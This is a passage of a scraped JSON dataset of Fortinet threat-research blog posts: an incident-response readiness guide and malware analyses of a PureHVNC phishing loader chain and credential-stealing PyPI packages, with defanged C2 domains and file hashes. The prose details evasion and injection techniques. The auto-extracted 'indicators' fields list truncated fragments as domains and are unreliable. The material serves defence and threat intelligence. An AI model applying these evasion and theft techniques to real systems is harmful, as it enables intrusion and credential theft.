1ded5a6c54a7b10365c41bc850ce41f18d86435fbe9315c37bd767ecdf2551357b98622db7a62ace626dcc8af5bb7ac3726a968241c94612c5b9cb906175f5f3fb73e089d0a276617b9a213080f84d0e411592c7db5548790e3fe1c53295f5a3a676c7490086a4112f920936e57ee49e213aaffd12bb38bc433a073ddfae0f241235419877ccc1f1820cc75e773fe79f9ad0296dd8eea9aa44f511a7b6348cfd02aed2b21a90c82d2ca597340aabfa1d6c52302b08aa9f58e87893f6997c268102c8f22e9d2df7e051fffc49c7d2d240787fbe8395b4c3c96be40b5a111a03ce0a971e606e839e7d5e72dcea0a8a3d081c951250ce25b0ddaf2429bad87ebe3d12ae203fa199291754649a4e592fb0880339c88b07f1d69798114afca06b806114bf52de60e60a526141ffe61ef5afc2a3bc7d60d4086e644ec80e67513d268417ff585fadcf40e25ad9d09cf007d20f6691ccf31d93a5d48d25f7e811cb0ca422bfdc52a65905088b8b897a630c66c16ec5c2eba992c1c0722e5c8da9afa18124a871b7b837b217d271747337381fbbcff61edfe44e087c55921564b170a8c947d7ce4ce72ca7e0cebab472e2165a1ebbd9395a60d7478990fd4dbec2eb195f583001d3d4dc0a72c92cf27a390e95e1fad6229d18ab255b625985939eb4b90f7172dff66af9c34958a3b095210664c26a934b5f734b64ea3170f1507a12050372542f81546656de73e009b541ed12cbcc9feced4f6ab79f9e9a0ee9df148b6a76b1c8b026ac9e72ffe8ac1dd8d18abfbb4eb9c23bccb42ab9af2580ed72b7ad8378960ee2bfc32930e19f762f561f4a6448160de2bde6ce330309326d745f898790506401a3bac69f6669a3dd832650e4752ff68dd6f0cef35b43e6ad59d7df8a6b352c45e48e3564e259ade4f544d01900e8c3f9a74e52ae3bc62f74ddf0138b7d3de2c77c59663ec5d8969b688530a3c9228b72807bc17a9822d558c42ee8a47423b59d75e228198450f7a9a2e051eeca6388028a6deb8e9843951bf21575aae7f34bdc0aa362bb42eb5e4cff69b60d67f7f155a3e2b9b905c90a1cc2aac4ad753becec205160b78de45c11ed42f3da707c9cee0688fa4190233a9b4f1379ad9bd41e73eff193caab25960b6a990641ea8d412b5ba456b64ad165b7216c48b50ad87cd7ce19ae30cb709ea3ceb7107b129c64ec9c314157fc6a8df079262bc486ca7291799a7474196c7cf60158421a2d81697e24e693e76cd1da06b9bf1cce8224de916a5eb0c76c9ba7acc3833f8cdc7f7d31a72dfbe69d2be1f8b7cc48d208b80a6608c72c3c590f86d93b074533c0c4ef8a46b6d36ed52cc2b4c179d5d63792ee67c6f1702188695387c64991029dabd702d48eac3ea3f0eef280d4a1ebd3a506c226e98dcedc1b882a11addd25ded8ee5110249b5b1a391e4d77d327 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/valleyrat-campaign-targeting-chinese-speakers",
      "scraped_at": "2025-07-20T13:46:25.789604",
      "indicators": {
        "ip_address": [
          "154.82.85.12"
        ],
        "domain": [
          "ventvwr",
          "salgbg",
          "r",
          "inword",
          "ithub",
          "odhelper",
          "ww",
          "sLoader",
          "ompMgmtLauncher",
          "leanmgr",
          "ome",
          "ndWinword",
          "fWinword",
          "olorcpl",
          "fwwlib",
          "xecutesWinword",
          "rewwlib",
          "xplorer",
          "aliciouswwlib"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": [
          "http://www.baidu.com.",
          "https://github.com/killeven/DllToShellCode/blob/master/DllToShellCode/shellcode_data.c."
        ]
      },
      "threat_score": 0.35626535626535627
    }
  },
  {
    "id": "Fortinet_81419",
    "source": "Fortinet",
    "title": "Preparation Is Not Optional: 10 Incident Response Readiness Considerations for Any Organization",
    "text": "FortiGuard Labs Threat Research Let’s face it: Cyberthreats aren’t going anywhere. As technology continues to evolve and grow, so will the tactics and techniques used by threat actors. A recentreport from Statistaestimates the global cost of cybercrime to reach $15.63 trillion by 2029. To combat this, one of the most important things organizations can do is be prepared. According to the National Institute of Standards and Technology(NIST), the incident response life cycle can be broken down into four key stages, with the first, and arguably most important, being preparation. Your organization can take several proactive preparatory steps to ensure incident response (IR) readiness, including evaluating the existing threat landscape of your environment. These steps include conducting regular risk assessments, implementing comprehensive security policies, and providing continuous monitoring and threat intelligence gathering. Organizations can enhance their IR capabilities by investing in training programs and simulation exercises, enabling a swift and effective reaction to cyber incidents. Let’s examine several readiness activities that can be conducted well before any cybersecurity incident. These activities can ultimately help improve your organization’s overall IR and cybersecurity maturity. Feeling prepared for a worst-case scenario can be deceptive because untested organizations may not fully grasp what they are unaware of. Readiness assessments conducted by an external third party provide a critical perspective on your organization’s current state of readiness. Such assessments should include evaluating processes, procedures, personnel, documentation, and technology to gauge the maturity of your organization’s overall IR readiness. Unlike an audit, these assessments are designed to pinpoint potential weaknesses that could undermine your ability to respond effectively to an incident. Organizations can proactively address deficiencies outside active engagement by identifying people (capacity and skill gaps), processes, or technology. This proactive approach identifies opportunities to strengthen resilience against cyberthreats and enhances readiness. Ultimately, such assessments empower organizations to fortify their defenses and better protect themselves in an increasingly complex and challenging cybersecurity landscape. An IR plan serves as a comprehensive guidebook for managing cyber incidents. It meticulously outlines your organization’s response strategies before, during, and after incidents of any type and severity. It also details the structure of your IR team, specifying roles and responsibilities to ensure clarity and efficiency during an incident. The plan encompasses the essential steps of IR: preparation, detection and analysis, containment, eradication and recovery, and post-incident activity. Each step is designed to methodically address and mitigate the impact of incidents, ensuring a structured approach to incident management. Additionally, an effective plan defines goals and objectives, incident severity levels, and other crucial elements that contribute to a comprehensive response framework. Most importantly, the IR plan should be viewed as a living document. It requires regular updates and maintenance to remain effective and relevant. Fortinet recommends conducting a bi-annual review of the plan and an evaluation after each significant incident. This review process ensures that lessons learned are integrated into the plan and that any organizational changes are reflected and addressed. Without such a plan, organizations may make ad hoc decisions during a crisis, leading to costly and ineffective outcomes. A well-maintained IR plan provides a clear roadmap during incidents and enhances your organization’s ability to respond swiftly and effectively to challenges. Incident response playbooks are an essential extension of the broader IR plan, offering standardized procedures tailored to specific incidents. Such playbooks provide a clear, actionable framework that outlines the precise steps an organization must take to prepare for, respond to, and recover from each distinct type of incident. By focusing on specific incident scenarios, playbooks ensure that the response is not only swift but also effective and consistent. Each IR playbook provides detailed guidance on all phases of IR, including preparation, detection and analysis, containment, eradication, recovery, and post-incident activity. These documents should also designed to be comprehensive, featuring step-by-step action items assigned to specific members of the response team. This level of detail ensures that all tasks are accounted for and every objective is met during an incident response. Typical playbooks include ransomware, malware, business email compromise, denial-of-service attacks, data loss incidents, lost or stolen devices, insider threats, and zero-day vulnerabilities. The playbook should delineate specific actions and responsibilities for each scenario, ensuring the response team is well-prepared to handle an incident efficiently and confidently. Once an IR plan and playbook are in place, it’s time to test them with a tabletop exercise. According toNIST, a tabletop is “a discussion-based exercise where personnel… [discuss] their roles during an emergency and their responses to a particular emergency situation.” To simplify, a tabletop exercise is like a role-playing game. A facilitator provides the participants with facts, or “injects,” about a fictional cybersecurity incident. The participants then discuss how to respond to those facts using the IR plan and playbook as a guide. These exercises can be developed and catered to a specific audience, usually as an operational exercise for technical team members or a senior-level exercise where organizational leaders focus on business and policy-related decisions during an incident. Tabletop exercises should be conducted at least annually. However, a quarterly cycle is optimal for the teams to stay fresh and improve their response to cybersecurity incidents. Unfortunately, many security and IT professionals are unaware of what IR resources exist or how to access them. This makes it difficult for security teams to understand the context of an observed activity or efficiently discover an incident’s breadth and depth. It is also not uncommon for security and IT professionals to not know what data may be impacted when a system is compromised. In either scenario, critical time may be wasted tracking down business owners, building out network maps, or other activities that should have occurred well before an incident. This can significantly slow response efforts and increase business impact. System inventories should include information such as the business owner, system functionality, hostnames and IPs,data classification, data criticality, relevant audit or regulatory information, and other crucial identifying information that could be useful to incident responders. Such information can help identify and ensure timely responses to the most critical systems across the organization. Understanding the business processes associated with these systems is essential so informed decisions can be made throughout the incident. Network diagrams assist incident responders in understanding where systems are, how the network is segmented, and potential chokepoints or isolation points that can be used to help contain and eradicate a threat actor. Developing system inventories and network diagrams before an incident enables a more efficient and effective response, enabling responders to understand the organizational impact of a given system being compromised during an incident. Threat actors thrive on exploiting vulnerabilities in internet-facing systems as an initial access vector. Based on IR engagements handled by the FortiGuard IR team in the second half of 2023 and the first half of 2024, 46% of all incidents were directly the result of an exploit in a public-facing application. Vendors have often provided patches for these vulnerabilities weeks, months, and sometimes years before being exploited by the threat actor. While one can argue that patching is not foolproof due to zero-day vulnerabilities, patching known vulnerabilities efficiently narrows the organization’s threat landscape and removes low-hanging fruit that can be an enticing entry point. Vulnerability assessments are critical for evaluating and refining the effectiveness of a patch management process. These assessments are typically scoped to target internal or external IPs or systems, employing automated tools and manual techniques to scrutinize existing vulnerabilities across systems, applications, and network devices. It is essential during such assessments to meticulously review results to eliminate false positives and accurately assess the potential impact of vulnerabilities on the organization. While vulnerability assessments focus on known vulnerabilities, penetration tests play a complementary role in uncovering unknown weaknesses that may compromise your organization’s networks, systems, or applications. Penetration testing can be tailored to specific environments, such as internal or external networks, or even concentrate on individual segments within these networks. These assessments are designed to identify potential entry points threat actors could exploit to infiltrate external environments or pivot within internal networks. Alternatively, penetration tests may focus on a specific web or mobile application, conducting a thorough examination to identify potential vulnerabilities that could be exploited for malicious purposes or to gain unauthorized access within a network. Although regulatory requirements may mandate annual penetration tests for specific environments, it is prudent for many organizations to conduct these assessments more often. Given the dynamic nature of networked environments—with continual integration of new systems and technologies—vulnerability assessments should be scheduled frequently, often monthly, with penetration testing commonly occurring at least annually and, if possible, more often. Active Directory (AD) infrastructures typically expand as organizations grow organically. While integral to Identity and Access Management (IAM) programs, AD environments are often neglected in terms of thorough management and security oversight. Conducting a comprehensive review of the AD environment is crucial to ensuring alignment with critical recommendations from Microsoft and standards bodies, such as NIST. This alignment enhances the overall security posture of the AD configuration and facilitates the optimization of logging features to support data collection and drive more effective incident detection and investigation efforts. An assessment of an AD environment should include evaluating its configuration against industry best practices. This process aims to identify and remediate potential security gaps, misconfigurations, or vulnerabilities malicious actors could exploit. By implementing recommended protocols, organizations can significantly reduce their overall threat landscape and strengthen their defenses against unauthorized access and potential breaches. Reviewing and enhancing AD logging is essential for swift and accurate incident response. Properly configured logs provide crucial insights into user activities, authentication attempts, and system events, enabling security teams to detect and mitigate threats promptly. This proactive approach helps mitigate potential risks and ensures compliance with regulatory requirements and industry standards. Investing in a thorough review and continuous management of the AD environment is essential for maintaining robust IAM practices and bolstering overall cybersecurity resilience. Many cybersecurity incidents can persist undetected for weeks or even months, underscoring the critical role of logs in effective incident investigation. Adopting a risk-based approach is essential for determining which logs to capture, defining retention periods, and establishing the necessary level of detail to support the investigative process. By aggregating logs generated by devices, networks, and security solutions, organizations can correlate data to assist in investigations and detect anomalous behaviors across their environment. Centralized logging forms the foundation of an effective detection program, but monitoring this collated information is equally vital. Without robust monitoring, organizations can overlook or miss critical alerts, potentially escalating cybersecurity incidents. Therefore, organizations must diligently ensure responsiveness to anomalies and alerts identified through comprehensive logging and security alerting mechanisms. By integrating centralized logging and vigilant monitoring, organizations can proactively identify and respond to events before they escalate into full-blown incidents. This proactive stance enhances IR capabilities and strengthens overall cybersecurity defenses, safeguarding against potential threats in today’s dynamic threat landscape. Over the past year, the FortiGuard IR team has observed a notable rise in the use of valid credentials during their engagements, accounting for approximately 54% of initial access methods. This trend underscores the growing sophistication of attackers who exploit legitimate credentials to gain unauthorized access, often enabling them to bypass traditional security measures. To effectively combat this threat, organizations should prioritize profiling normal user behavior within their environments to identify deviations indicative of malicious activity. One powerful approach is the implementation ofUser and Entity Behavior Analytics(UEBA). UEBA leverages advanced algorithms and machine learning to monitor user actions, establish behavioral baselines, and detect anomalies that could signal security incidents. For organizations utilizingFortiSIEM, deploying FortiSIEM agents with UEBA enabled can facilitate detailed user activity data collection, which can help detect anomalous, malicious behavior. However, sophisticated tooling is not strictly necessary for user behavior analysis, provided robust logging practices exist (see item 9 above). Organizations can create comprehensive behavioral baselines by systematically logging various user activities, such as logon times, devices used for authentication, accessed systems, and utilized applications. These baselines enable the identification of deviations that might indicate potential cybersecurity incidents. Defining what constitutes normal behavior and establishing thresholds for abnormal activities are crucial steps. When anomalies are detected, they may indicate compromised accounts or insider threats, necessitating immediate investigation and response. Regardless of how user behavior analysis is conducted, it’s crucial to have a playbook in place for response and responders. Integrating behavior profiling into security strategies is essential for mitigating the increasing threat of credential misuse. By leveraging UEBA (or even basic logging and monitoring), organizations can create a dynamic and responsive security posture that can quickly adapt to identify and mitigate threats. This proactive approach enhances early detection of malicious activities, strengthens IR capabilities, and fortifies your organization’s security framework. While this list is not exhaustive, and every organization must take additional measures, it covers the most common weaknesses found within the organizations Fortinet works with. We highly recommend that organizations start by working through the first four items on the list sequentially, especially if they haven’t been done or are not currently in place. The remaining items should be prioritized based on your business objectives. Did you know that FortiGuard Incident Response and Advisory Services can assist with many of the proactive services outlined above? Talk with your account manager today to see how we can help! incident response FortiGuard Labs Threat Research FortiGuard Labs Threat Research CISO Collective Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/preparation-is-not-optional-10-incident-response-readiness-considerations",
      "scraped_at": "2025-07-20T13:46:34.622662",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.10332434860736749
    }
  },
  {
    "id": "Fortinet_7404",
    "source": "Fortinet",
    "title": "PureHVNC Deployed via Python Multi-stage Loader",
    "text": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Any organizationImpact:Attackers gain control of the infected systemsSeverity level:High This past April, FortiGuard Labs uncovered a sophisticated attack that leveraged multiple layers of obfuscation and evasion techniques to distribute and execute VenomRAT via ScrubCrypt. However, this attack campaign didn’t end with VenomRAT, as the subsequently loaded plugin continued to deploy various types of malware into the victim’s environment. We recently identified a phishing campaign that also employs multiple layers of evasion techniques to deploy various malware into an infected environment. This campaign was aimed at employees and posed as a customer requesting a service. The email uses urgent language to deceive a victim into clicking a malicious attachment, initiating a series of harmful activities and deploying several types of malware. All the malware in this attack uses the same packing and obfuscation techniques, including a Python obfuscator, ‘Kramer,’ a shellcode generator, 'donut,' and a shellcode loader, 'laZzzy,' to conceal itself from detection. The deployed malware includes XWorm, Venom RAT, AsyncRAT, and PureHVNC. Figure 1 shows the attack chain. This threat report describes how this attack is delivered and analyzes the PureHVNC malware used in this campaign. The attack campaign starts with an email, shown in Figure 2. It implies that the inquiry email is from a customer and urges the recipient to open the attachment. This typical phishing email tactic uses job-related information and urgent language to deceive recipients into opening attachments or clicking links. The attachment is an HTML file that uses the “search-ms” functionality to query the “e_Statement” LNK file on remote file shares, as shown in Figure 3. Once the user opens the HTML file and clicks on “Open” to allow Windows Explorer to open, the malicious LNK file is shown in Windows Explorer and lures the user into executing it using a PDF icon. The LNK file contains a command to run a remote batch file using conhost.exe as the parent process. The attacker attempts to leverage the built-in Windows binary 'conhost.exe' for indirect execution to evade detection, as shown in Figure 4. This is an obfuscated batch file that hides the script by combining encoding tricks and string obfuscation. The file looks like UTF-16 encoding with Chinese characters because the bytes (FF FE) at the beginning can mislead a file editor into incorrectly detecting the encoding. Next, it performs a large number of character replacement operations with the specific charset. The de-obfuscation process is shown in Figures 5 and 6. The script begins by opening a decoy PDF file from the same remote file share. Next, it downloads two ZIP files via PowerShell, extracts all the content—including the Python Environment—into the folder \"%USERPOFILE%\\Downloads\\Python,\" sets the folder to hidden, and then runs the malicious Python program in sequence. Next, the decoy PDF is re-opened, initiating a persistence routine to download a second batch file and move it to the startup folder. The second ZIP file, used by the startup batch and containing several Python programs similar to those in the previous ZIP, is extracted to the “%USERPOFILE%\\Downloads\\Print” folder. Before completing all tasks, any unnecessary programs from subsequent tasks are removed. Each Python file is quite similar, as shown below. First, it imports a Base64 module to decode shellcode data and then decrypts it using an RC4 algorithm with a specific key. Finally, the code executes shellcode using an imported “ctypes” module. It should be noted that the RC4 key varies in each Python file. By tracking the same series of samples, we discovered a new Python shellcode loader. It's a compiled version of a Python file with an additional obfuscation layer added. The obfuscator, named \"Kramer,\" is available on GitHub, as shown in Figure 8. It obfuscates a Python file by encrypting the source code using an addition operation with a randomly generated key. The resulting obfuscated Python program combines the encrypted data with functions that limit the use of print and input commands, decode the encryption data, and execute the original source code. Finally, the program is compiled into a .pyc file and renamed with a .py extension. By extracting the key and encrypted data and following the decode function defined in the code, we obtained the source code. In this version, the code structure is similar, but the function names and variables are not obfuscated. The first shellcode primarily functions to decrypt and execute the next stage while bypassing AMSI/WLDP based on its configuration. The hack tool, \"donut,\" produces the shellcode, as shown in Figure 10. Once the decryption routine is completed, the decrypted data in memory reveals the flag, the APIs used for bypass mechanisms, and the entire PE file for the next stage, as seen in Figure 11. The second stage is a PE file that uses the Microsoft Management Console (MMC) icon, a built-in Windows program, to disguise itself as a regular application while functioning as an injector. This injector includes detailed debug information. As the program runs, each step of the injection process is displayed on the command line, as shown in Figure 12. We observed that a shellcode loader named \"laZzzy\" is publicly available on GitHub. It incorporates various execution techniques commonly used by malware and appears to be utilized in this stage for shellcode decryption, injection, and execution. Ultimately, the program uses the target and execution techniques selected by the attacker to inject the shellcode into notepad.exe and executes the shellcode via Early Bird APC Queue, as shown in Figure 13. The third stage involves a shellcode within notepad.exe, which is identical to the code found in the first shellcode. After decryption and bypassing AMSI/WLDP, the final payload is executed. In the next section, we will focus on PureHVNC, one of the malware identified in this attack campaign, along with additional plugins downloaded by the malware. We observed an unusual malware packed and obfuscated in the Remote Access Trojans (RAT) used in this attack campaign. It’s a . NET application containing a substantial block of built-in data. Its primary function is to decrypt its payload using the AES algorithm and then decompress it with the Gzip method. Once the DLL payload is extracted and loaded into memory, it employs its hard-coded class and method names to execute the payload's entry point, as shown in Figure 14. DLL Payload is protected by . NET Reactor, as seen in Figure 15. We partially de-obfuscated the program and renamed the functions. Its entry point was very easy to understand. After creating a mutex, the core function is then executed. In its core functionality, the program initially extracts the hardcoded configuration by performing base64 decoding followed by gzip decompression. Based on the flags in the configuration, it either sets the registry run key using PowerShell or prevents the system from sleeping by utilizing the Win32 API function, “SetThreadExecutionState,” as seen in Figure 16. Next, it attempts to communicate with the C2 server specified in the extracted configuration. Once the connection is established, it begins gathering victim information and reporting it to the C2 server, as shown in Figure 17. It abuses the Windows Management Instrumentation (WMI) system to gather information about the victim's system environment, including installed antivirus products, system and camera details, and user information. The VictimID is generated from the processor ID, disk serial number, memory serial number, and username. Additionally, the program searches for the paths of various extensions and applications based on a predefined list, as shown in Figures 18 and 19. Some applications also check the registry path to verify their installation. This list specifically targets crypto wallets, password managers, two-factor authenticators, and popular communication programs. After all the specified information is collected, it is sent to the C2 server to await further plugin loading. Figure 20 illustrates a method for handling incoming data from the C2 server after it has been preprocessed using gunzip and deserialization. When the program receives the plugin, it writes the plugin data and ID into the Windows Registry under the affected user’s HKEY_CURRENT_USER\\Software\\{VictimID}. The plugin data is then extracted, loaded into memory, and executed. Our analysis identified some details that helped us pinpoint the malware family. The same information appeared in the subsequently downloaded plugin, as seen below. In the following sections, we’ll elaborate on the plugins provided by the PureHVNC C2 server, which are obfuscated using the . NET Reactor. The initial plugin we received from the threat actor is a DLL file named “PluginRemoteDesktop.” As Figure 22 shows, its entry method is executed with the binary as a parameter to provide the module with C2 information. After extracting the C2 details, it communicates with the C2 server and executes the Remote Desktop function. Figure 23 shows one of the mouse-controlled functions and the APIs used by the RemoteDesktop program. PluginExecuting is a module responsible for executing additional files, updating the program, and even uninstalling malware. It follows a process similar to that of PluginRemoteDesktop at the entry point, using the C2 information extracted from parameters to communicate with the C2 server. It then waits to receive a packet to trigger the execution of the core function. The core function acts as a handler to process different commands based on their type. It supports six types of command, as illustrated in Table 1. DownloadAndExecuteDisk Execute a downloaded file DownloadAndUpdate Remove the current module and execute the downloaded file. UninstallConnection Delete the registry entry HKEY_CURRENT_USER\\Software\\{VictimID}, and remove the malware if it is not located in the %WINDOWS% folder. RestartConnection Start a new instance of the current module and terminate the existing process. CloseConnection Terminate the current process. DownloadAndExecuteMemory Run the downloaded payload in the designated process. Table 1: Commands PluginExecuting contains several important commands, particularly those related to downloading. Figure 24 illustrates the command used to create a hidden process that executes the downloaded file. These commands combine with a batch file to achieve both file deletion and execution, as shown in Figure 25. Additionally, theDownloadAndExecuteMemorycommand requires a binary and a target name as parameters. It injects the malicious binary into a specified target process using process hollowing and then resumes the injected process to execute the malicious code. Deploying multiple types of malware in an attack campaign is not unusual. In this case, the threat actor also uses complex, multilayer encryption to avoid detection across all the malware used in this campaign. In this article, we uncovered a phishing campaign targeting employees that employs a multi-stage execution flow and utilizes public hacking tools to evade detection. We also focused on one obfuscated payload, \"PureHVNC,\" detailing its functions and the additional plugins collected. Our observations indicate that it targets crypto wallets, password managers, and 2FA authenticators. Finally, it can carry out further attacks using its RemoteDesktop and Executing plugins. The malware described in this report are detected and blocked byFortiGuard Antivirusas: HTML/Phishing.3771!trLNK/Agent.1B2F!trBAT/Agent. PSCL!trPython/Agent. PSCL!trMSIL/Agent. DWN!trMSIL/Agent. CFQ!trMSIL/Agent. DWN!trMSIL/Bladabindi. SSNY!trMSIL/GenericKD.61253965!trMSIL/Agent.7C2C!trMSIL/Agent. PEP!tr.dldr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros within the document. We also suggest that organizations take the free FortinetFortinet Certified Fundamentals (FCF)cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact the GlobalFortiGuard Incident Response Team. drvenomjh[.]duckdns[.]org vxsrwrm[.]duckdns[.]org ncmomenthv[.]duckdns[.]org ghdsasync[.]duckdns[.]org anachyyyyy[.]duckdns[.]org xoowill56[.]duckdns[.]org hxxps://float-suppose-msg-pulling[.]trycloudflare[.]com/ 16a4de0540181bab7c5d25fcdf90838a28f2dff4ed9e0e37de3f5f1ab20afe0a 062c5f5e9cdfd731912b262297e963b6d5e1b1d114184728065522f46a5eef2f 2b7ee0ccfa45d2f53098cd8aa4ce73cb00ace462d8490e6843bf05cd07854553 430300b8c527259805d29ab3fd150d9d297004ff77346cc07753290d84e77e95 503ce7bcefdffb96b5de78254f947598a410b86d3aaf597c7334e248c46dae5b 55134d705ccf881d011af949ad2fc0aa80dc7af50fa4a9db29b665647b869aec 561f4b4e2c16f21b0db015819340fc59484e4994022c4cca46cf778006d5d441 6b4f058ba41e829ff993e61b288e55552af3d98f9cd62483eeff088b26f6ab9b 71b797032458aab9b4a1a203e7ca413f009af1961cffb98590e34f672574599a 7292316900a0971aec0a302bc3c6632902d820804ce3b2375a9953744cab1bd9 72ce64d50f9aa15b21631307d2143f426364634a7a2ee4b401ef76bd88c4ff3b 8bbdd3b41a03b86f246564a23e9acd48f74428f372c4bfb0a9a3af42511661c7 8d28191f647572d5e159f35ae55120ddf56209a18f2ca95a28d3ca9408b90d68 90995c621718ae65ca0af4deb10a9cb895bd494df40a7b34031b17efcc63114a b393323b9834656a2999198d4f02c1a159c6034d3c20c483d22a30aab3810c0c b3bb7064af80abef417e6e7775a7e14b0bd27233fd66c2252e714a4dd2ee9c21 d4e8bf427c196d1d5ffca52a5af7162cc5cf4df730ee3fe65b4381ac79662a15 e5f7efb35b7316c7ace1c322559fa9a8680ddb1ac15bef7d17e5b84c767f5b75 95a33ba5550747baf72e39b020e6215b6047983eda17250408cd6f4c16a93089 1967661f7c32607f7cfcb9053aeb8dea0a9d8f49979e729be77a43628c91469f 7c4e613cf4db19f54030097687227809f965a951a26a44a882692ece6e642e3c 441c4502584240624f4af6d67eded476c781ff0b72afe95ea236cc87a50e5650 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/purehvnc-deployed-via-python-multi-stage-loader",
      "scraped_at": "2025-07-20T13:46:41.607566",
      "indicators": {
        "ip_address": [],
        "domain": [
          "r",
          "otepad",
          "onhost"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "8bbdd3b41a03b86f246564a23e9acd48f74428f372c4bfb0a9a3af42511661c7",
          "72ce64d50f9aa15b21631307d2143f426364634a7a2ee4b401ef76bd88c4ff3b",
          "430300b8c527259805d29ab3fd150d9d297004ff77346cc07753290d84e77e95",
          "7c4e613cf4db19f54030097687227809f965a951a26a44a882692ece6e642e3c",
          "503ce7bcefdffb96b5de78254f947598a410b86d3aaf597c7334e248c46dae5b",
          "71b797032458aab9b4a1a203e7ca413f009af1961cffb98590e34f672574599a",
          "90995c621718ae65ca0af4deb10a9cb895bd494df40a7b34031b17efcc63114a",
          "441c4502584240624f4af6d67eded476c781ff0b72afe95ea236cc87a50e5650",
          "8d28191f647572d5e159f35ae55120ddf56209a18f2ca95a28d3ca9408b90d68",
          "16a4de0540181bab7c5d25fcdf90838a28f2dff4ed9e0e37de3f5f1ab20afe0a",
          "561f4b4e2c16f21b0db015819340fc59484e4994022c4cca46cf778006d5d441",
          "b393323b9834656a2999198d4f02c1a159c6034d3c20c483d22a30aab3810c0c",
          "95a33ba5550747baf72e39b020e6215b6047983eda17250408cd6f4c16a93089",
          "062c5f5e9cdfd731912b262297e963b6d5e1b1d114184728065522f46a5eef2f",
          "2b7ee0ccfa45d2f53098cd8aa4ce73cb00ace462d8490e6843bf05cd07854553",
          "6b4f058ba41e829ff993e61b288e55552af3d98f9cd62483eeff088b26f6ab9b",
          "e5f7efb35b7316c7ace1c322559fa9a8680ddb1ac15bef7d17e5b84c767f5b75",
          "1967661f7c32607f7cfcb9053aeb8dea0a9d8f49979e729be77a43628c91469f",
          "55134d705ccf881d011af949ad2fc0aa80dc7af50fa4a9db29b665647b869aec",
          "d4e8bf427c196d1d5ffca52a5af7162cc5cf4df730ee3fe65b4381ac79662a15",
          "b3bb7064af80abef417e6e7775a7e14b0bd27233fd66c2252e714a4dd2ee9c21",
          "7292316900a0971aec0a302bc3c6632902d820804ce3b2375a9953744cab1bd9"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.49648946840521563
    }
  },
  {
    "id": "Fortinet_26922",
    "source": "Fortinet",
    "title": "Malicious Packages Hidden in PyPI",
    "text": "FortiGuard Labs Threat Research Affected platforms:All platforms where PyPI packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, etc. Severity level:High The FortiGuard Labs team has identified a malicious PyPI package affecting all platforms where PyPI packages can be installed. This discovery poses a significant risk to individuals and institutions that have installed these packages, potentially leading to the leakage of credentials and sensitive information. Given the high severity of this threat, it is crucial to focus on this specific PyPI package. This report discusses its potential impacts and emphasizes the importance of diligent security practices in managing software dependencies. On July 3, the Fortinet AI-driven OSS malware detection system identified a malicious package named zlibxjson version 8.2, published on June 29, 2024. This package contained a malicious URL that downloaded various files, including an executable (.exe) file packed with PyInstaller. The .exe file was unpacked to retrieve .pyc files, which were then decompiled into Python (.py) files. Among the numerous Python and DLL files discovered, three were particularly problematic: Discord_token_grabber.pyget_cookies.pypassword_grabber.py. These files are designed to steal sensitive information, such as Discord tokens, browser cookies, and stored passwords. We examine each of these files in the following sections. The provided code is malicious for several reasons, but primarily because it aims to steal sensitive information from Discord users and send it to an external server controlled by the attacker. 1. Token Extraction: The code extracts Discord tokens from the user's local machine by searching for patterns that match token formats in local files. Tokens are used to authenticate users with Discord’s API. Stealing these tokens allows an attacker to gain unauthorized access to the victim's Discord account. The class `extract_tokens` performs this search in local application data directories using regular expressions. The tokens are then validated and decrypted if necessary. 2. Decryption of Stored Data: The code includes functionality to decrypt stored passwords and tokens using the system's master key. This allows the attacker to access sensitive data stored securely by the system. 3. Data Exfiltration: The code sends the extracted tokens and other user information to the attacker's server by making HTTP requests to Discord's API endpoints. It gathers user profile information, billing details, guild memberships, and gift codes. The collected data is then formatted and sent to an external server, enabling the attacker to use or sell the stolen information. The `fetch_tokens` class collects this wide range of information using the stolen tokens. 4. Persistence and Evasion: The code includes retry mechanisms and various methods to ensure it can continue its operations even if some attempts fail. The collected data is then formatted and sent to an external server or presented in a format that can be easily sent to the attacker. This file includes some critical malicious activities, including cookies theft, decryption of stored data, and data exfiltration, 1. Cookie Theft: The code's primary purpose is to steal cookies from various web browsers, such as Chrome, Firefox, Brave, and Opera. Cookies often contain sensitive information like session tokens, login credentials, and other personal data. The code also accesses and copies browser data directories without user consent, indicating a clear malicious intent. 2. Decryption of Stored Data: The code decrypts stored cookies using the system's master key, which is extracted from the browser's local state files. This involves decrypting data that is typically securely stored. It unlocks encrypted cookie data, bypassing security mechanisms that protect user information. 3. Data Exfiltration: The decrypted cookies are saved to a file named `cookies.txt` located in the user's directory (`C:\\\\Users\\\\{getuser()}\\\\cookies.txt`), a tactic commonly used to collect and later exfiltrate sensitive data. This indicates an intent to gather and potentially transfer sensitive information. Additionally, the code creates temporary directories and files, possibly to hide its activities and ensure persistence. The provided code is malicious. It is designed to steal saved passwords from web browsers, specifically Google Chrome and Microsoft Edge, and decrypt them for unauthorized access. Here's a detailed analysis of why this code is malicious: Detailed Analysis: The functions `get_passwords_edge()` and `main()` access the 